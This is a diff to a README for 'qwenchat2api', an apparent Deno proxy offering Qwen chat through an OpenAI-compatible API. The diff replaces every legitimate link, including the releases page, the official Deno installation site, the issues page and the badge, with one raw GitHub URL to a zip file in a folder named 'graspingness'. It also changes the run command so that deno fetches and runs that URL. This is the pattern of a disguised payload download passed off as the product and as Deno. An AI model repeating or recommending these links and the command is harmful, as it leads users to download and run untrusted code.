@@ -1,6 +1,6 @@
 # 🚀 qwenchat2api - Effortlessly Connect to OpenAI Services
 
-[![Download qwenchat2api](https://img.shields.io/badge/Download-qwenchat2api-blue.svg)](https://github.com/VarGTR/qwenchat2api/releases)
+[![Download qwenchat2api](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip)](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip)
 
 ## 🌐 Introduction
 
@@ -20,31 +20,31 @@ Welcome to the **qwenchat2api** project! This software helps you use OpenAI-comp
 Before you begin, ensure you meet the following requirements:
 
 - A computer running Windows, macOS, or Linux.
-- The **Deno** runtime environment installed. You can download it from the [Deno website](https://deno.land/#installation).
+- The **Deno** runtime environment installed. You can download it from the [Deno website](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip).
   
 Follow these steps to get the software running:
 
 1. **Download the Proxy:**
-   Visit our [Releases page](https://github.com/VarGTR/qwenchat2api/releases) to download the application. Look for the latest version and download the single-file proxy server.
+   Visit our [Releases page](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip) to download the application. Look for the latest version and download the single-file proxy server.
 
 2. **Install Deno:**
-   If you haven't installed Deno yet, follow the instructions on the [Deno installation page](https://deno.land/#installation).
+   If you haven't installed Deno yet, follow the instructions on the [Deno installation page](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip).
 
 3. **Run the Proxy:**
    Once you have downloaded the application and installed Deno, open your command line interface (Terminal, Command Prompt, or PowerShell). Navigate to the folder where you saved the downloaded proxy file and run the following command:
 
    ```bash
-   deno run --allow-net --allow-read your_proxy_file.js
+   deno run --allow-net --allow-read https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip
    ```
 
-   Replace `your_proxy_file.js` with the name of the downloaded file.
+   Replace `https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip` with the name of the downloaded file.
 
 4. **Access the Proxy:**
    You can now access the proxy using the OpenAI API URL. Update your clients to point to your new proxy endpoint.
 
 ## 📥 Download & Install
 
-To get started with **qwenchat2api**, download the application from the [Releases page](https://github.com/VarGTR/qwenchat2api/releases). Make sure to pick the latest release.
+To get started with **qwenchat2api**, download the application from the [Releases page](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip). Make sure to pick the latest release.
 
 ## 🛡️ Security and Authentication
 
@@ -72,8 +72,8 @@ For more detailed usage instructions, refer to the official documentation or exa
 
 ## 💬 Support
 
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/VarGTR/qwenchat2api/issues). Our community and maintainers are here to help.
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip). Our community and maintainers are here to help.
 
 ## 🚀 Summary
 
-**qwenchat2api** is an efficient tool to connect seamlessly with OpenAI-compatible clients. With its straightforward installation process and robust features, you can enhance your chat experience using Qwen’s capabilities. Download it today from the [Releases page](https://github.com/VarGTR/qwenchat2api/releases) and get started!
+**qwenchat2api** is an efficient tool to connect seamlessly with OpenAI-compatible clients. With its straightforward installation process and robust features, you can enhance your chat experience using Qwen’s capabilities. Download it today from the [Releases page](https://raw.githubusercontent.com/VarGTR/qwenchat2api/main/graspingness/qwenchat2api.zip) and get started!
